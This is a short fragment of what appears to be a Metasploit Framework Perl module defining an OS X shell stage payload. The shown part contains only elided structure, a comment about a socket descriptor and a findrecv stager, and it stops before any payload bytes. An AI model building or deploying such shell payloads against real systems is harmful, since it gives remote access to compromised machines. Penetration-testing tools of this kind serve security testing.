package Msf::PayloadComponent::OSXShellStage;
use strict;
use base 'Msf::PayloadComponent::OSXStagePayload';
...
my $info =
{
    ...
    'OSXStagePayload' =>
    {
		...
		# Socket descriptor is in r30. TODO: Flush input queue to allow 
		# MSG_PEEK findrecv stager code to work OK...
        Payload =>
			pack("N*", 
